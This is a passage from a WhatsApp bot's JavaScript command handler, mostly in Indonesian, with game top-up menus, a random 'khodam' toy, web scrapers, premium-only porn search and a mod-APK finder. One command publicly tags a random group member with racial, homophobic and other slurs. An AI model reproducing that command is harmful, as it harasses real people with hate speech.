id: `.pembayarandm`
},
{
title: '100 uc',
description: "27k", 
id: `.pembayarandm`
},
{
title: '125 uc', 
description: "33k", 
id: `.pembayarandm`
},
{
title: '200 uc', 
description: "47K", 
id: `.pembayarandm`
},
{
title: '300 uc', 
description: "67K", 
id: `.pembayarandm`
},
{
title: '500 uc', 
description: "102K", 
id: `.pembayarandm`
},
{
title: '750 uc', 
description: "154K", 
id: `.pembayarandm`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1234567890@newsletter',
 newsletterName: 'Powered By KyyDev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup pubgl Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'pembayarandm': {
reply(`Jika Sudah Transfer Silahkan Tekan Tombol Owner Di Bawah Dan Ketik Id Sesuai Game di private chat owner Contoh : 
FF : 12344××××
ML : 12355×××× ( 2828282 )
PUBG : 282828×××`)
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Dana","id":"${prefix}dana"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Qris","id":"${prefix}qris"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"owner","id":"${prefix}owner"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: '12345678',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await kyy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
case 'cekkhodam2':{
    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    let lana;
    if (args.length === 0 || !args[0]) {
        return m.reply('Harap masukkan nama kamu.');
    } else {
        lana = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    
    const khodam = [
  "Singa",
  "kosoong atau tidak ada",
  "Harimau",
  "Elang",
  "Serigala",
  "Naga",
  "Gajah",
  "Kuda",
  "Macan Tutul",
  "Kerbau",
  "Burung Hantu",
  "Burung Rajawali",
  "Ikan Hiu",
  "Lumba-Lumba",
  "Ular",
  "Kura-Kura",
  "Tupai",
  "Paus",
  "Kelelawar",
  "Kijang",
  "Banteng",
  "Rusa",
  "Anjing",
  "Kucing",
  "Buaya",
  "Kambing",
  "Kuda Nil",
  "Bebek",
  "Angsa",
  "Ayam",
  "Merpati",
  "Burung Beo",
  "Burung Kenari",
  "Burung Kakatua",
  "Bunglon",
  "Cicak",
  "Kodok",
  "Katak",
  "Tikus",
  "Landak",
  "Kanguru",
  "Koala",
  "Panda",
  "Beruang",
  "Rubah",
  "Lynx",
  "Leopard",
  "Jaguar",
  "Cheetah",
  "Badak",
  "Zebra",
  "Antelop",
  "Unta",
  "Alpaka",
  "Llama",
  "Serigala Abu-abu",
  "Serigala Merah",
  "Serigala Putih",
  "Lynx",
  "Harimau Putih",
  "Harimau Siberia",
  "Harimau Sumatra",
  "Gorila",
  "Orangutan",
  "Simpanse",
  "Monyet",
  "Babun",
  "Lemur",
  "Iguana",
  "Komodo",
  "Salamander",
  "Belut",
  "Sotong",
  "Gurita",
  "Kepiting",
  "Lobster",
  "Udang",
  "Kupu-kupu",
  "Lebah",
  "Tawon",
  "Kumbang",
  "Belalang",
  "Jangkrik",
  "Semut",
  "Kecoak",
  "Laba-laba",
  "Kalajengking",
  "Serangga Tongkat",
  "Naga Laut",
  "Kuda Laut",
  "Duyung",
  "Putri Duyung",
  "Burung Kolibri",
  "Burung Hantu Salju",
  "Burung Puyuh",
  "Burung Gagak",
  "Burung Pelikan",
  "Burung Albatros",
  "Burung Flamingo",
  "Burung Hering",
  "Burung Camar",
  "Burung Pinguin",
    "Cincin",
    "Batu Akik",
    "Keris",
    "Tongkat",
    "Pusaka",
    "Patung",
    "Mustika",
    "Tasbih",
    "Kalung",
    "Gelang",
    "Permata",
    "Pedang",
    "Mata Uang",
    "Wesi Kuning",
    "Serat Tali",
    "Belati",
    "Cundrik",
    "Selendang",
    "Jarum",
    "Tombak",
    "Kerikil",
    "Kendi",
    "Kain Kafan",
    "Topi",
    "Payung",
    "Sandal",
    "Kacamata",
    "Sabuk",
    "Sarung",
    "Tali Ikat Pinggang",
    "Surat",
    "Kunci",
    "Lilin",
    "Peniti",
    "Sisir",
    "Cermin",
    "Kendi Air",
    "Piring",
    "Gelas",
    "Mangkuk",
    "Sendok",
    "Sapu",
    "Gayung",
    "Tikar",
    "Bantal",
    "Guci",
    "Lentera",
    "Lampu",
    "Buku",
    "Pena",
    "Dupa",
    "Asbak",
    "Cangkir",
    "Gantungan Kunci",
    "Kalender",
    "Sepeda",
    "Lukisan",
    "Batu Kerikil",
    "Batu Kali",
    "Kipas",
    "Peci",
    "Sorban",
    "Rokok",
    "Topeng",
    "Gamelan",
    "Angklung",
    "Suling",
    "Wayang",
    "Kuda-Kudaan",
    "Sepatu",
    "Jam Tangan",
    "Kosong atau tidak adaa"
];


    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
    let text = `Khodam ${lana} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}    
    


    let res;
    try {
        res = await tts(text, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(text, defaultLang);
    } finally {
        reply(text)
        if (res) {
await kyy.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: m });
        }
    }
};
break
case 'wtssc': {
reply(` *WTS*

_SCRIPT HANAKO AI V6_
_TYPE CASE_

BASE : HWMODS
FEATURE : KYYXD
PENGEMBAN : KYYXD

*FEATURE? CEK SENDIRI*
wa.me/+628877319724
`)
}
break
 case 'xxxxplay':{
if (!text) return reply(`Example : ${prefix+command} story wa anime`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
kyy.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
 case 'tolol':
      case 'gaguna':
      case 'jomok':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'anjink':
      case 'babi':
      case 'kucing':
      case 'beban':
      case 'bebankeluarga':
      case 'gadakeluarga':
      case 'miskin':
      case 'sampah':
      case 'wibu':
      case 'cantik':
      case 'ganteng':
      case 'tampan':
      case 'cute':
      case 'kind':
      case 'Islam':
      case 'kristen':
      case 'hindu':
      case 'katolik':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return reply('Khusus Group')
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
kyy.sendMessage(m.chat,
{ text: `The Most ${command} Here Is @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./KyyMedia/image/kyy.jpg`),
"sourceUrl": `http://wa.me/+6288286326619`}}},
{ quoted: m})
}
break
 	case 'hentaivid2': {
if (!m.isGroup) return reply('Khusus Group')
if (!isPrem) return reply('Khusus Prem')
reply(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
kyy.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
        case "sad1":
        case "sad2":
        case "sad3":
        case "sad4":
        case "sad5":
        case "sad6":
        case "sad7":
        case "sad8":
        case "sad9":
        case "sad10":
        case "sad11":
        case "sad12":
        case "sad13":
        case "sad14":
        case "sad15":
        case "sad16":
        case "sad17":
        case "sad18":
        case "sad19":
        case "sad20":
        case "sad21":
        case "sad22":
        case "sad23":
        case "sad24":
        case "sad25":
        case "sad26":
        case "sad27":
        case "sad28":
        case "sad29":
        case "sad30":
        case "sad31":
        case "sad32":
        case "sad33":
        case "sad34":
        case "sad35":
              bayuamore_dev = await getBuffer(
          `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
         );
         await kyy.sendMessage(
          m.chat,
          {
           audio: bayuamore_dev,
           mimetype: "audio/mp4",
           ptt: true,
          },
          { quoted: m }
         );
         break;  
case 'buylimit': {
let sections = [{
title: 'Buyed Limit',
highlight_label: 'Recomended',
rows: [{
title: 'Infinty',
description: `20k`, 
id: `.pembayaran`
},
{
title: '20 Limit',
description: "3k", 
id: `.pembayaran`
},
{
title: '30 Limit', 
description: "6k", 
id: `.pembayaran`
},
{
title: '40 Limit', 
description: "10k", 
id: `.pembayaran`
},
{
title: '50 Limit', 
description: "13k", 
id: `.pembayaran`
},
{
title: '60 Limit', 
description: "16k", 
id: `.pembayaran`
},
{
title: '100 Limit', 
description: "20k", 
id: `.pembayaran`
}]
}]

let listMessage = {
    title: 'Buy Linit Ckick Hare', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1234567890@newsletter',
 newsletterName: 'Powered By KyyDev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Membeli Limit Untuk Mengakses Bot!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari tokoh terkenal maupun legenda

*/
case 'siapakah':
case 'sk': {
  async function siapakah(query) {
    let response = await axios.get(`https://www.google.com/search?q=Siapakah ${query}&hl=id`)

    let $ = cheerio.load(response.data)
    let result = {
      result: []
    }
    let content = $('div[class="BNeawe tAd8D AP7Wnd"]').text()
    
    result.result.push(
      content
        .replace('tampilkan semua', '')
        .replace('Tampilkan Semua', '')
        .replace('Tampilkan semua', '')
        .replace('tampilkan Semua', '')
        .replace('TAMPILKAN SEMUA', '')
        .replace(/[0-9]/g, '') 
    )
    
    return result
  }
  if (!text) return reply(`*Format Seperti Ini:* ${command} jokowi\n\nFitur Masih Dalam Pengembangan`)
  siapakah(text).then(response => {
    if (response.result[0].length < 1) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('tidak cocok')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('yang lain')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('maps')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('map')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('...')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (/[^\x00-\x7F]/.test(response.result[0])) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (/(?:\.\.\.|[\u2026])/.test(response.result[0])) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].length > 300) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    reply(response.result[0])
  })
}
break
 /* 

Credits: zaenishi
Jenis fitur: random foto anime hd

*/

case 'kcrandom': case 'kcimg': {
async function animeRandom() {
    try {
        let response = await axios.get('https://konachan.net/post?tags=order%3Arandom');
        let $ = cheerio.load(response.data);
        let hasil = {
            status: 200,
            creator: 'zaenishi',
            imageUrl: []
        };
        $('#post-list-posts a.directlink.largeimg').each((index, element) => {
            hasil.imageUrl.push( $(element).attr('href') );
        });
        return hasil;
    } catch (error) {
        console.error('Error:', error);
return error
    }
}

react('🕐', m.chat, m.key)
try {
let response = await animeRandom()
let random = pickRandom(response.imageUrl)

conn.sendMessage(m.chat, { image: { url: random }, caption: 'Random Image Anime\n\n*Powered By konachan.net*' }, { quoted: m })
} catch (e) {
reply(e)
}
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari mod apk

*/

case 'mods': case 'modapk': {
  const axios = require('axios')
  const cheerio = require('cheerio')

  async function mods(apk) {
    const url = `https://m.happymod.com/search.html?q=${apk}`

    const response = await axios.get(url)
    const html = response.data
    const $ = cheerio.load(html)

    const apps = []

    $('.app-info-list .s-app-block').each((index, element) => {
      const app = {
        creator: 'zaenishi',
        status: 200,
        title: $(element).find('.info-wrap .nowrap a').text().trim(),
        image: $(element).find('.img img').attr('data-src'),
        downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
      }
      apps.push(app)
      if (apps.length >= 5) return false
    })

    return apps
  }

  if (text) {
    const response = await mods(text)
    let result = ''

    response.forEach((app, index) => {
      result += `*${index + 1}*. ${app.title}:\n`
      result += `∘ Download ${app.downloadUrl}\n\n`
    })

    conn.sendMessage(m.chat, {
      text: result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: `M O D S  S E A R C H`,
          body: `Looking for Cool and Free Apk Mods!`,
          sourceUrl: 'https://m.happymod.com',
          thumbnailUrl: thurl,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })
  } else {
    reply(`Masukan Text, *Seperti Format Ini*: .${command} minecraft`)
  }
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari berita tentang islam di dunia, lengkap, dan terbaru

*/

case 'islamnews': case 'islamn': {
const axios = require('axios')
const cheerio = require('cheerio')

async function islamNews() {
        try {
            const response = await axios.get('https://www.cnbcindonesia.com/tag/islam')
            const $ = cheerio.load(response.data)
            let result = []

            $('li').each((index, element) => {
                const link = $(element).find('a').attr('href')
                const imgSrc = $(element).find('.ratiobox_content.lqd img').attr('src')
                const titleElement = $(element).find('h2')
                const dateElement = $(element).find('.date')

                if (titleElement.length > 0 && dateElement.length > 0) {
                    const title = titleElement.text().trim()
                    const date = dateElement.text().trim()

                    result.push({
                        creator: 'zaenishi',
                        status: 200,
                        link: link,
                        img: imgSrc,
                        title: title,
                        date: date
                    })
                }
            })

            return result
        } catch (error) {
            console.error('Error fetching data:', error.message)
            throw error
        }
    }

if (!text) {
islamNews().then(result => {
        if (result.length > 0) {
            let islamText = ''
            result.forEach((news, index) => {
                islamText += `*${index + 1}. ${news.title}* ${news.date}\n\n∘ ${news.link}\n\n`
            })
            reply(islamText + `*Untuk Mendapatkan Info Selanjutnya Silahkan Ketik .${command} <url>*`)
        } else {
            reply('No data found.')
        }
    }).catch(error => {
        console.error('Error:', error.message)
        reply('An error occurred while fetching data. Please try again later.')
    })
} else {
async function islamData(url) {
const cheerio = require('cheerio')
let zaenishi = await axios.get(url)
let $ = cheerio.load(zaenishi.data)
let result = []
let title = $('.jdl'). find('.container').find('h1').text()
let desk = $('.detail_text').find('p').text()
result.push({

title: title,
desk: desk
})
return result
}
islamData(text).then(respon => {
let islamText = `*${respon[0].title}*\n\n${respon[0].desk}`
reply(islamText)
})
}
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari kata kata/quotes dari goodreads berdasarkan nama tokoh

*/
case 'quotes':
case 'quotess':
case 'goodreads': {
  async function quotess(nama) {
    const cheerio = require('cheerio')
    let zaenishi = await axios.get(`https://www.goodreads.com/quotes/search?q=${nama}`)
    let $ = cheerio.load(zaenishi.data)
    let hasil = []

    $('.quoteText').each((index, element) => {
      let selectedQuote = $(element).clone()
        .children()
        .remove()
        .end()
        .text()
        .replace(/\s+/g, ' ')
        .replace(/―/g, '')
        .trim()

      let selectedAuthor = $(element).find('.authorOrTitle').text().trim()
      let formattedAuthor = selectedAuthor.replace(/\s+/g, ' ').trim()

      hasil.push({
        creator: 'zaenishi',
        status: 200,
        quotes: selectedQuote,
        author: formattedAuthor
      })
    })

    return hasil
  }

  if (!text) return reply(`*Quotes Siapa?* .${command} <nama>`)

  quotess(text).then(respon => {
    if (respon.length > 0) {
      const randomIndex = Math.floor(Math.random() * respon.length)
      const formattedResult = `${respon[randomIndex].quotes}\n\n*- ${respon[randomIndex].author}*`
      reply(formattedResult)
    } else {
      reply(`Quotes Tidak Ditemukan`)
    }
  })
  }
  break
 /* 

Credits: zaenishi
Jenis fitur: mencari kuliner di kota anda, berdasarkan kota bahkan ras

*/

case 'kuliner': {
  async function ku(ajur) {
    const cheerio = require('cheerio')
    const axios = require('axios')

    try {
      const response = await axios.get(`https://info-kuliner.com/category/masakan-${ajur}/`)
      const $ = cheerio.load(response.data)
      const result = []

      $('.post').each((index, element) => {
        const nama = $(element).find('.entry-title').text().trim()
        const link = $(element).find('.entry-title a').attr('href')
        const ct = $(element).find('.entry-content').text().trim()

        result.push({
          creator: 'zaenishi',
          status: 200,
          nama: nama,
          link: link,
          ct: ct
        })
      })

      return result
    } catch (error) {
      throw error
    }
  }

  async function zaenar(url) {
    const cheerio = require('cheerio')
    try {
      const zaenishi = await axios.get(url)
      const $ = cheerio.load(zaenishi.data)
      let hasil = []
      let deskripsiText = ''

      const unwantedStrings = [
        'Your email address will not be published.',
        'Comment',
        'Name *',
        'Email *',
        'Website',
        'Save my name, email, and website in this browser for the next time I comment.',
        'Shark Magazine by Shark Themes',
        'Shark Magazine',
        'by Shark Themes',
        'Copyright © 2024 | All Rights Reserved',
        'Info Kuliner',
        'Rumah Makan | Restoran | Tempat Makan | Cafe'
      ]

      $('p').each((index, element) => {
        const deskripsi = $(element).text().trim()
        if (!unwantedStrings.some(unwanted => deskripsi.includes(unwanted))) {
          deskripsiText += `${deskripsi}\n`
        }
      })

      const ogImageUrl = $('meta[property="og:image"]').attr('content')

      hasil.push({
        creator: 'zaenishi',
        result: deskripsiText.trim(),
        gambar: ogImageUrl
      })

      return hasil
    } catch (error) {
      throw error
    }
  }

  if (!text) return reply(`*Format Seperti Ini* .${command} sunda`)
  
if (text.includes('https://info-kuliner')) {
  try {
    const response = await zaenar(text)
    const formattedResult = response[0].result
      .replace(/\n\s*\n/g, '\n\n')
      .trim()
    reply(formattedResult)
  } catch (error) {
    console.error('Error:', error.message)
    reply('Terjadi kesalahan dalam mengambil data. Silakan coba lagi nanti.')
  }
} else {
  try {
    const result = await ku(text)

    if (result.length > 0) {
      let replyText = `*Daftar Tempat Kuliner ${text}:*\n\n*Ketik .${command} <url> Untuk Melihat Info Rumah Makan*\n\n`

      result.forEach((entry, index) => {
        replyText += `*${index + 1}. ${entry.nama}*\n   ${entry.link}\n   ${entry.ct}\n\n`
      })

      reply(replyText)
    } else {
      reply(`Maaf, tidak ada data kuliner ${text} yang ditemukan.`)
    }
  } catch (error) {
    console.error('Error:', error.message)
    reply(`Terjadi kesalahan dalam mengambil data ${error.message}. Silakan coba lagi nanti.`)
  }
}
}
break
 /* 

Credits: zaenishi
Jenis fitur: rekomendasi game, terbaru berdasarkan tahun

*/

case 'rekomendasi_game':
    case 'gamepop': {
    const cheerio = require('cheerio')
    
    async function meme() {
  try {
    const response = await axios.get('https://carisinyal.com/category/games/')
    const $ = cheerio.load(response.data)

    const recommendations = []

    $('.oxy-post-wrap').each((index, element) => {
      const title = $(element).find('.oxy-post-title').text().trim()
      const url = $(element).find('.oxy-post-title').attr('href')

      recommendations.push({
        creator: 'zaenishi',
        status: 200,
        title,
        url
      })
    })

    return recommendations
  } catch (error) {
    console.error('Error fetching or parsing data:', error.message)
  }
}

async function meme1(url) {
  try {
    const response = await axios.get(url)
    const $ = cheerio.load(response.data)

    const asu = []

    $('.wp-block-heading').each((index, element) => {
      const name = $(element).text().trim()
      asu.push({
        creator: 'zaenishi',
        status: 200,
        name: `${name}`
      })
    })

    return asu
  } catch (error) {
    console.error('Error fetching or parsing data:', error.message)
  }
}

      if (!text) {
      try {
        const recommendations = await meme()
        const recommendationText = recommendations.map((rec, index) => `*${index + 1}.* ${rec.title} ${rec.url}`).join('\n\n')
        reply(`${recommendationText}\n\n*Salin URL dan ketik .${command} (URLnya)*`)
        } catch (e) {
        reply(`Mungkin Ada Masalah.`)
        }
      } else {
            try {
        const meme1Result = await meme1(text)
        const meme1Text = meme1Result.map((meme, index) => `${meme.name}`).join('\n')
        reply(meme1Text)
              } catch (e) {
        reply(`Url Tidak Tersedia, Atau terjadi Masalah`)
        }
        }
      }
      break
 /*
   creator: zaenishi
   team: jamurTeam
   contact: 6283188229366
*/

case 'otakudessearch': case 'animes': case 'otaksearch': {
const axios = require('axios');
const cheerio = require('cheerio');

async function anu(search) {
 const url = 'https://otakudesu.cloud/?s=' + search + '&post_type=anime';

 try {
   let response = await axios.get(url);
   const $ = cheerio.load(response.data);

   const results = [];

   $('ul.chivsrc li').each((index, element) => {
     const title = $(element).find('h2 a').text();
     const link = $(element).find('h2 a').attr('href');
     const image = $(element).find('img').attr('src');
     const genres = [];

     $(element).find('.set a').each((i, el) => {
       genres.push($(el).text());
     });

     const status = $(element).find('.set:contains("Status")').text().replace('Status : ', '');
     const rating = $(element).find('.set:contains("Rating")').text().replace('Rating : ', '');

     results.push({ title, link, image, genres, status, rating });
   });

   return results;
 } catch (error) {
   console.error("Error fetching data:", error);
 }
}

async function ah(search) {
  let ngent = '';
  try {
    let response = await anu(search);
    let genre = [];
    response[0].genres.forEach((element, index) => {
      genre.push(`(${element})`);
    });
    ngent = `*👀 ANIME SEARCH*

\`nama:\` ${response[0].title}
\`link:\` ${response[0].link}
\`image:\` ${response[0].image}
\`genres:\` ${genre.join(', ')}
\`status:\` ${response[0].status}
\`rating:\` ${response[0].rating}`;
  } catch (error) {
    console.error(error);
  }
  return ngent;
}

if (!text) return reply('Penggunaan: .otakudesSearch shinigami')
ah(text).then(response => {
reply(response)
})
}
break
 /*
   creator: zaenishi
   team: jamurTeam
   contact: 6283188229366
*/

case 'otakudesdetails': case 'detailsanime': case 'animedetail': {
async function otakudesDetails(link) {
    try {
        const zaenishi = await axios.get(link);
        const $ = cheerio.load(zaenishi.data);
        const hasil = [];

        const judul = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Judul')).parent().text().trim().split(': ')[1];
        const skor = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Skor')).parent().text().trim().split(': ')[1];
        const produser = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Produser')).parent().text().trim().split(': ')[1];
        const tipe = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Tipe')).parent().text().trim().split(': ')[1];
        const status = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Status')).parent().text().trim().split(': ')[1];
        const studio = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Studio')).parent().text().trim().split(': ')[1];
        const rilis = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Tanggal Rilis')).parent().text().trim().split(': ')[1];
        const episode = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Total Episode')).parent().text().trim().split(': ')[1];
        let sinopsis = '';
        $('.sinopc p').each((index, element) => {
            sinopsis += $(element).text().trim() + '\n';
        });
        const genreArray = [];
        $('div.infozingle span b').filter((index, element) => $(element).text().includes('Genre')).siblings('a').each((index, element) => {
            genreArray.push($(element).text().trim());
        });
        const genre = genreArray.join(', ');

        hasil.push({
            judul: judul,
            skor: skor,
            produser: produser,
            tipe: tipe,
            status: status,
            studio: studio,
            rilis: rilis,
            episode: episode,
            genre: genre,
            sinopsis: sinopsis.trim()
        });

        return hasil;
    } catch (error) {
        console.error('Error:', error);
        return [];
    }
}

if (!text) return reply(`Ikuti contoh penggunaan ini: .${command} https://otakudesu.cloud....`)
let response = await otakudesDetails(text)
if (response.length === 0) return reply(`Gagal Mendapatkan Respon Api.`)
reply(`*📰 Anime Details OtakudesuDetails*
Judul: ${response[0].judul}
Skor: ${response[0].skor}
Produser: ${response[0].produser}
Tipe: ${response[0].tipe}
Status: ${response[0].status}
Studio: ${response[0].studio}
Rilis: ${response[0].rilis}
Episode: ${response[0].episode}
Genre: ${response[0].genre}

*📖 Sinopsis:*\n\n${response[0].sinopsis}`)
}
break
case 'xnxxsearch': {
	if (!isPrem) return reply(mess.premium)
	if (!text) return reply(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) reply(ff)
              }
              break
              case 'sendprofile': case 'sendprofil':
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await kyy.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await kyy.sendContact(partnerJID, [m.sender.split("@")[0]])
kyy.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
kyy.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
